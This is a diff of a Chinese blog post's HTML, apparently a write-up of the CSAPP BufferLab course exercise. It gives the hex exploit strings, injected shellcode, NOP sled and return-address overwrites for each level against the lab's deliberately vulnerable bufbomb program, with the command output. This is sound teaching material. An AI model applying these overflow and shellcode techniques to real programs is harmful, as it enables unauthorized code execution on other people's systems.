@@ -16,17 +16,17 @@
   <meta name="author" content="luzhixing12345">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言 本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32) 本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略 本次实验采用 bovik 用户,cookie值为 0x1005b2b7  实验报告 本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档  Level0 第一关的要求是返回到smo">
+    <meta name="description" content="BufferLab  前言 本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32) 本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略 本次实验采用 bovik 用户,cookie值为 0x1005b2b7 需要 32 位工具链 sudo apt-get install gcc-multilib  实验报告">
 <meta property="og:type" content="article">
 <meta property="og:title" content="04-BufferLab">
 <meta property="og:url" content="https://luzhixing12345.github.io/2022/11/11/CSAPP/04-BufferLab/index.html">
 <meta property="og:site_name" content="kamilu的博客">
-<meta property="og:description" content="前言 本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32) 本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略 本次实验采用 bovik 用户,cookie值为 0x1005b2b7  实验报告 本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档  Level0 第一关的要求是返回到smo">
+<meta property="og:description" content="BufferLab  前言 本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32) 本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略 本次实验采用 bovik 用户,cookie值为 0x1005b2b7 需要 32 位工具链 sudo apt-get install gcc-multilib  实验报告">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111023303.png">
 <meta property="article:published_time" content="2022-11-10T17:23:22.000Z">
-<meta property="article:modified_time" content="2022-11-11T15:29:15.244Z">
+<meta property="article:modified_time" content="2023-06-04T11:37:31.382Z">
 <meta property="article:author" content="luzhixing12345">
 <meta property="article:tag" content="CSAPP">
 <meta name="twitter:card" content="summary_large_image">
@@ -190,7 +190,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      7k 字
+      6.8k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      59 分钟
+      57 分钟
     </span>
   
 
@@ -232,15 +232,18 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：6 个月前
+                  本文最后更新于：2 分钟前
                 
               </p>
             
             <div class="markdown-body">
-              <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+              <h1 id="bufferlab"><a class="markdownIt-Anchor" href="#bufferlab"></a> BufferLab</h1>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
 <p>本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32)</p>
 <p>本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略</p>
 <p>本次实验采用 <code>bovik</code> 用户,cookie值为 <code>0x1005b2b7</code></p>
+<p><strong>需要 32 位工具链</strong></p>
+<div class="code-wrapper"><pre><code class="hljs bash">sudo apt-get install gcc-multilib</code></pre></div>
 <h2 id="实验报告"><a class="markdownIt-Anchor" href="#实验报告"></a> 实验报告</h2>
 <p>本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档</p>
 <h3 id="level0"><a class="markdownIt-Anchor" href="#level0"></a> Level0</h3>
@@ -269,7 +272,7 @@ pop   %ebp</code></pre></div>
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00
 18 8c 04 08</code></pre></div>
-<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 0.txt | ./bufbomb -u bovik</span>
+<div class="code-wrapper"><pre><code class="hljs bash">$ ./hex2raw &lt; 0.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Smoke!: You called smoke()
@@ -295,7 +298,7 @@ NICE JOB!</code></pre></div>
 42 8c 04 08
 00 00 00 00
 b7 b2 05 10</code></pre></div>
-<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 1.txt | ./bufbomb -u bovik</span>
+<div class="code-wrapper"><pre><code class="hljs bash">$ ./hex2raw &lt; 1.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Fizz!: You called fizz(0x1005b2b7)
@@ -311,10 +314,11 @@ Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-k
    0x08048c9e &lt;+1&gt;:     mov    %esp,%ebp
    0x08048ca0 &lt;+3&gt;:     sub    <span class="hljs-variable">$0x18</span>,%esp
    0x08048ca3 &lt;+6&gt;:     mov    0x804d100,%eax</code></pre></div>
-<p>构造的汇编如下</p>
+<p>构造的汇编如下, a.s</p>
 <div class="code-wrapper"><pre><code class="hljs x86asm">movl <span class="hljs-number">$0</span>x1005b2b7,<span class="hljs-number">0x804d100</span>
 <span class="hljs-keyword">ret</span></code></pre></div>
-<p><code>gcc -c -m32</code> <code>objdump</code>得到的字节码如下</p>
+<p><code>gcc -c -m32 a.s</code> 编译得到 a.o, 这是一个 32 位的 elf 文件</p>
+<p><code>objdump -d a.o</code> 反汇编得到的字节码如下</p>
 <div class="code-wrapper"><pre><code class="hljs txt">level2.o:     file format elf32-i386
 
 
@@ -355,7 +359,7 @@ c3 00 00 00 00 00 00 00 00 00
 00 00 00 00
 88 35 68 55
 9d 8c 04 08</code></pre></div>
-<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 2.txt | ./bufbomb -u bovik</span>
+<div class="code-wrapper"><pre><code class="hljs bash">$ ./hex2raw &lt; 2.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Bang!: You <span class="hljs-built_in">set</span> global_value to 0x1005b2b7
@@ -389,7 +393,7 @@ Disassembly of section .text:
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00
 88 35 68 55</code></pre></div>
-<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 3.txt | ./bufbomb -u bovik</span>
+<div class="code-wrapper"><pre><code class="hljs bash">$ ./hex2raw &lt; 3.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Boom!: getbuf returned 0x1005b2b7
@@ -514,8 +518,6 @@ Disassembly of section .text:
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90
 
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
@@ -539,12 +541,12 @@ Disassembly of section .text:
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 
-90 90 90 90 90 8d 6c 24 28 b8
 90 90 90 90 90 8d 6c 24 28 b8
 b7 b2 05 10 68 3a 8e 04 08 c3
-90 90 90 90
+
+00 00 00 00
 d8 33 68 55</code></pre></div>
-<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 4.txt -n | ./bufbomb -u bovik -n</span>
+<div class="code-wrapper"><pre><code class="hljs bash">$ ./hex2raw &lt; 4.txt -n | ./bufbomb -u bovik -n
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:KABOOM!: getbufn returned 0x1005b2b7
